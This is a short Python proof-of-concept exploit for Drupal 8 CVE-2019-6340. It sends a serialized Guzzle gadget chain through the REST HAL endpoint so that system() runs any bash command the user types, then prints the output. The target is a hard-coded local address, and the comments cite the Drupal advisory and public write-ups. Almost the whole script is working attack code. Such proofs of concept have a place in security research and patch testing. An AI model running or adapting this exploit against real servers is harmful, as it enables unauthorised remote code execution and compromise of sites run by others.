# Tested on Drupal 8.6.9 with all 4 of the REST modules turned on: HAL, HTTP Basic Authentication, RESTful Web Services, Serialization
# https://www.ambionics.io/blog/drupal8-rce
# https://github.com/g0rx/Drupal-SA-CORE-2019-003/blob/master/cve-2019-6340.py
# https://www.drupal.org/sa-core-2019-003
import requests
import json

node_number = input("Enter a new node number: ")
remote_command_to_execute = input("Enter a bash command: ")

# Change host IP address if not it's not 172.17.0.2
host = 'http://172.17.0.2:8000'

url = host + f"/node/{node_number}"
headers = {
  'Content-Type': 'application/hal+json',
  'Cache-Control': 'no-cache',
  'Accept': 'application/hal+json',
}
query = {
  '_format': 'hal_json',
}

# Creating the payload and encoding the command using Guzzle encoding
data = {
  'link': [{'value': 'link',
            'options':  "O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:{s:33:\"\u0000"
                        "GuzzleHttp\\Psr7\\FnStream\u0000methods\";a:1:{s:5:\""
                        "close\";a:2:{i:0;O:23:\"GuzzleHttp\\HandlerStack\":3:"
                        "{s:32:\"\u0000GuzzleHttp\\HandlerStack\u0000handler\";"
                        "s:|size|:\"|command|\";s:30:\"\u0000GuzzleHttp\\HandlerStack\u0000"
                        "stack\";a:1:{i:0;a:1:{i:0;s:6:\"system\";}}s:31:\"\u0000"
                        "GuzzleHttp\\HandlerStack\u0000cached\";b:0;}i:1;s:7:\""
                        "resolve\";}}s:9:\"_fn_close\";a:2:{i:0;r:4;i:1;s:7:\"resolve\";}}"
                        "".replace('|size|', str(len(remote_command_to_execute))).replace('|command|', remote_command_to_execute)
            }
          ],
  '_links': {'type': {'href': host + '/rest/type/shortcut/default'}},
}

response = requests.get(url, params=query, data=json.dumps(data).encode('utf-8'), headers=headers)

# Parsing the command result
command_result = response.text.split("}")[-1]

print("Command executed succesfuly, command output is:")
print(command_result)
